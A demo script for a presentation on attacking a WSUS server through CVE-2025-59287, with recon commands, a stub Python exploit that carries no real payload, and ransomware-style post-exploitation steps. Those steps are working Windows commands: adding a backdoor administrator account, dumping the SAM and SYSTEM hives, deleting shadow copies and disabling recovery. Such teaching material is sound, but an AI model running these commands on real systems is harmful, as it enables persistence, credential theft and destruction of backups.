# CVE-2025-59287 Attack Demo Commands

## Prerequisites on Attacker Machine (Fedora)

```bash
# Install required tools
sudo dnf install -y nmap python3-pip curl
pip install requests pyyaml
```

## Phase 1: Reconnaissance

```bash
# Discover WSUS server
nmap -p 8530,8531 192.168.100.100

# Verify WSUS is running (should return XML)
curl -s http://192.168.100.100:8530/ClientWebService/client.asmx | head -20

# Get server info
curl -s "http://192.168.100.100:8530/ServerSyncWebService/serversyncwebservice.asmx" -H "Content-Type: text/xml"
```

## Phase 2: Exploit (CVE-2025-59287)

The vulnerability is a deserialization flaw in the WSUS event handler.

```bash
# Using public PoC (for demo, we'll simulate with a simplified version)
# Real exploits available on GitHub - search "CVE-2025-59287 PoC"

python3 wsus_exploit.py --target 192.168.100.100 --port 8530 --cmd "whoami"
```

For the demo, you can use this simplified approach that shows the concept:

```python
#!/usr/bin/env python3
"""
CVE-2025-59287 Exploit Concept Demo
DO NOT USE ON SYSTEMS YOU DON'T OWN
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.100.100"
PORT = 8530

# The actual exploit sends a crafted serialized object
# This is a simplified demonstration of the attack surface
payload = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!-- Malicious deserialization payload would go here -->
    <!-- Real exploit uses .NET BinaryFormatter gadget chains -->
  </soap:Body>
</soap:Envelope>
"""

print(f"[*] Targeting WSUS at {TARGET}:{PORT}")
print(f"[*] In a real attack, this would exploit deserialization in event handling")
print(f"[*] Result: Remote Code Execution as SYSTEM")
```

## Phase 3: Post-Exploitation

Once you have RCE:

```bash
# Commands that would run on the compromised server:

# Reconnaissance
whoami /all
hostname
ipconfig /all
net user
net localgroup administrators

# Find sensitive data
dir C:\SensitiveData /s
type C:\SensitiveData\client_list.txt
type C:\SensitiveData\infrastructure_creds.txt

# Persistence (what ransomware groups do)
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add

# Lateral movement prep
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

## Phase 4: The "Boom" Moment

Show what ransomware does:

```bash
# Simulate ransomware behavior (DON'T ACTUALLY RUN RANSOMWARE)
# Just show the concept:

# 1. Disable recovery
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled no

# 2. Stop services that lock files
net stop mssqlserver /y
net stop mysql /y

# 3. In a real attack, encryption would happen here
# (We don't do this in the demo - just show the commands)
```

## Key Demo Points

1. **Time to weaponize**: Attackers had working exploits within HOURS of disclosure
2. **Irony**: The patch management tool itself was the vulnerability
3. **Access level**: Exploiting WSUS gives SYSTEM - highest privileges
4. **MSP impact**: One WSUS server often manages hundreds of client machines
5. **Defense**: This is why you need AI-speed detection, not human-speed
